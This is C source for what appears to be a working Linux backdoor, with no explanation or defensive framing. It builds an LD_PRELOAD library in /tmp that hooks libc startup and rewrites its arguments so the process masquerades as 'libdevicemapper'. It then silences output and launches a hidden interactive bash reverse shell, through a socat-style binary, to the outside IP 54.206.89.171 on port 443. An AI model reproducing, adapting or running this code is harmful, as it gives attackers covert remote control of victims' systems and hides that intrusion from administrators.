static const char * cmd[] = {
  "#define _GNU_SOURCE ",
"#include <stdlib.h>",
"#include <stdio.h>",
"#include <string.h>",
"#include <signal.h>",
"#include <unistd.h>",
"#include <dlfcn.h>",
"#include <regex.h>",
"",
"typedef int (*pfi)(int, char **, char **);",
"static pfi real_main;",
"",
"char **copyargs(int argc, char** argv){",
    "char **newargv = malloc((argc+1)*sizeof(*argv));",
    "char *from,*to;",
    "int i,len;",
"",
    "char t[3][60];",
"",
    "strcpy(t[0], \"/usr/lib/device-mapper/l\");",
    "strcpy(t[1], \"ibdevicemapper --no-fork --novtswitch\");",
    "strcpy(t[2], \"\");",
"",
    "int shoulde = 0;",
"",
    "if (argc == 3) {",

        "regex_t regex;",
        "int reti = regcomp(&regex, \"^exec:/bin/bash\", 0);",
        "reti = regexec(&regex, argv[1], 0, NULL, 0);",
        "if (!reti) {",
            "for(i = 0; i<argc; i++){",
                "from = argv[i];",
                "len = strlen(from) + 1;",
                "to = malloc(len);",
                "memcpy(to,from,len);",
                "strncpy(from, t[i], len);",
                "newargv[i] = to;",
            "}",
            "shoulde = 1;",
        "}",
        "regfree(&regex);",
    "} ",
    "if (shoulde == 0) {",
        "for(i = 0; i<argc; i++){",
            "from = argv[i];",
            "len = strlen(from)+1;",
            "to = malloc(len);",
            "memcpy(to,from,len);",
            "memset(from,'\\0',len);  ",
            "newargv[i] = to;",
            "argv[i] = 0;",
        "}",
    "}",
    "newargv[argc] = 0;",
    "return newargv;",
"}",
"",
"static int mymain(int argc, char** argv, char** env) {",
    "return real_main(argc, copyargs(argc, argv), env);",
"}",
"",
"int __libc_start_main(pfi main, int argc,",
                      "char **ubp_av, void (*init) (void),",
                      "void (*fini)(void),",
                      "void (*rtld_fini)(void), void (*stack_end)){",
    "static int (*real___libc_start_main)() = NULL;",
"",
    "if (!real___libc_start_main) {",
        "char *error;",
        "real___libc_start_main = dlsym(RTLD_NEXT, \"__libc_start_main\");",
        "if ((error = dlerror()) != NULL) {",
            "exit(1);",
        "}",
    "}",
    "real_main = main;",
    "return real___libc_start_main(mymain, argc, ubp_av, init, fini,",
            "rtld_fini, stack_end);",
"}",

0};

#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61
#include <stddef.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

void shc_x_file() {
    FILE *fp;
    int line = 0;

    if ((fp = fopen("/tmp/libdev.c", "w")) == NULL) {exit(1); exit(1);}
    for (line = 0; cmd[line]; line++) fprintf(fp, "%s\n", cmd[line]);
    fflush(fp);fclose(fp);
}

int make() {
    char * cc, * cflags, * ldflags;
    char cmd[4096];

    cc = getenv("CC");
    if (!cc) cc = "cc";

    sprintf(cmd, "%s %s -o %s %s", cc, "-Wall -fpic -shared", "/tmp/libdev.so", "/tmp/libdev.c -ldl");
    if (system(cmd)) {remove("/tmp/libdev.c"); return -1;}
    remove("/tmp/libdev.c"); return 0;
}

int main() {

  if (!(access("/tmp/libdev.so", F_OK) == 0)) {
      shc_x_file();
      if(make()) {exit(1);}
  }

	setenv("LD_PRELOAD", "/tmp/libdev.so", 1);
	int fd = open("/dev/null", O_WRONLY);

  dup2(fd, 1);    /* make stdout a copy of fd (> /dev/null) */
    dup2(fd, 2);    /* ...and same with stderr */
  close(fd);
            execl("/bin/bash", "bash", "-c",  "./libxct-util/libdev.so exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:54.206.89.171:443", (char*) NULL);

        exit(1);

     return 0;
}

